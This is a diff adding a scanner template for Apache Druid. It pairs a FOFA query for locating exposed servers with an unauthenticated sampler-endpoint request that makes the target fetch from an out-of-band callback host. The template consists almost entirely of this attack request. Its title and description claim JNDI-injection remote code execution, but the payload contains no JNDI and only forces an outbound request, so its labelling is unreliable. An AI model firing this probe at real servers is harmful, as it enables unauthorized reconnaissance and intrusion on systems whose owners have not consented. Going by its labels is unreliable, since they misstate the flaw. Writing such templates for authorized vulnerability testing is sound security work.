@@ -1,0 +1,43 @@
+id: apache-druid-rce
+
+info:
+  name: Apache Druid 远程代码执行漏洞 (CVE-2021-36749)
+  author: god
+  severity: critical
+  description: Apache Druid 未授权访问 + JNDI 注入导致 RCE
+  metadata:
+    fofa-query: app="APACHE-Druid"
+  tags: druid,rce,cve
+
+http:
+- raw:
+  - |
+    @timeout: 15s
+    GET /status/health HTTP/1.1
+    Host: {{Hostname}}
+
+  max-redirects: 0
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - '{"status":"ok"}'
+      condition: and
+
+- raw:
+  - |
+    @timeout: 30s
+    POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json
+
+    {"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"http","uris":["http://{{interactsh-url}}"]}}},"samplerConfig":{"numRows":1}}
+
+  max-redirects: 0
+  matchers-condition: and
+  matchers:
+    - type: word
+      words:
+        - "dns"
+      part: interactsh_protocol
